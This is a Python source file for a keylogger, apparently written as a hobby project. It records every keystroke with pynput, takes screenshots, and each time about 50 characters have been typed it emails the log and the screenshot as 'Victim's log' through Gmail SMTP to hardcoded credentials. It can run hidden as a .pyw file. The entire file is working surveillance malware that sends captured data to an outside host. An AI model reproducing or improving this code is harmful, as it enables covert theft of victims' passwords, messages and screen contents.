import smtplib,ssl
from pynput.keyboard import Key, Listener
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
import pyautogui
import cv2  #opencv-python
import numpy as np
import os

#email info
email = "keyloggeremailtester@gmail.com"
password = "passwordforkeylogger"
port = 465

#logger
email_log = ''
word = ''
email_char_limit = 50


def on_press(key):
    global word
    global email_log
    global email
    global email_char_limit

    #whitespace
    if key == Key.space or key == Key.enter or key == Key.tab:
        if key == Key.space:
            word += ' '
        elif key == Key.enter:
            word += '\n'
        elif key == Key.tab:
            word += '\t'

        email_log += word
        word = ''
        if len(email_log) >= email_char_limit:
            send_log()
            print(email_log)    #won't show up if .pyw
            email_log = ''

    #special keys
    elif key == Key.shift_l or key == Key.shift_r:
        #do not print shift keys
        return
    elif key == Key.backspace:
        word = word[:-1]
    elif key == Key.caps_lock or key == Key.ctrl_l or key == Key.ctrl_r or key == Key.cmd or key == Key.menu or key == Key.insert or key == Key.delete or key == Key.home or key == Key.num_lock or key == Key.left or key == Key.right or key == Key.up or key == Key.down or key == Key.end or key == Key.page_up or key == Key.page_down:
        char = f'{key}'
        char = char.replace("Key.", "")  # strip char of 'Key.'
        word += '[' + char + ']'
    #cmd                    also known as the Windows key
    #menu                   on Windows oriented keyboards. Looks like a hamburger button, sometimes inside of a box and/or with a mouse.
    #left,right,up,down     arrow keys

    #Print F#
    elif key==Key.f1 or key==Key.f2 or key==Key.f3 or key==Key.f4 or key==Key.f5 or key==Key.f6 or key==Key.f7 or key==Key.f8 or key==Key.f9 or key==Key.f10 or key==Key.f11 or key==Key.f12:
        char = f'{key}'
        char = char.replace("'", "")   #strip char of apostrophes
        char = char.replace("Key.", "")    #strip char of 'Key.'
        char = '[' + char + ']'
        word += char.upper()

    #numpad numbers
    elif hasattr(key, 'vk') and key.vk >= 96 and key.vk <=105:
        #TODO: fix this block and delete the code below
        #num = f'{key}'
        #num = num.replace("<", "")    #strip of <>
        #num = num.replace(">", "")
        #numInt = int(num)
        #numInt -= 96
        #word += numInt        #Crashes when you print numInt

        #hacky version that works:
        num = 0
        if key.vk == 97: num = 1
        elif key.vk == 98: num = 2
        elif key.vk == 99: num = 3
        elif key.vk == 100: num = 4
        elif key.vk == 101: num = 5
        elif key.vk == 102: num = 6
        elif key.vk == 103: num = 7
        elif key.vk == 104: num = 8
        elif key.vk == 105: num = 9
        word += num

    #numpad decimal
    elif hasattr(key, 'vk') and key.vk == 110:
        word+='.'

    #regular keys and other unknown keys
    else:
        char = f'{key}'
        char = char.replace("'","") #strip char of apostrophes
        char = char.replace("Key.", "")    #strip char of 'Key.'
        word += char

    #Closes the program upon pressing Esc
    #TODO: log Esc key instead
    if key == Key.esc:
        return False


#take screenshot and send email
def send_log():
    #take screenshot
    img = pyautogui.screenshot()  #PIL screenshot
    img = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)  #convert to numpy array
    cv2.imwrite("scrnsht.png",img)

    #attach message
    final = MIMEMultipart()
    final['Subject']='Victim\'s log'
    final['From']=email
    final['To']=email
    final.attach(MIMEText(email_log))

    #attach screenshot
    screenshot=open('scrnsht.png','rb')
    img=MIMEImage(screenshot.read())
    img.add_header('Content-Disposition','attachment',filename="scrnsht.png")
    final.attach(img)

    #actually send the email
    try:
        server = smtplib.SMTP_SSL('smtp.gmail.com',port)
        server.ehlo()
        server.login(email,password)
        server.sendmail(email,email,final.as_string())
        server.close()
        print("Email sent")
    except:
        print("Email not sent")


with Listener(on_press=on_press) as listener:
    listener.join()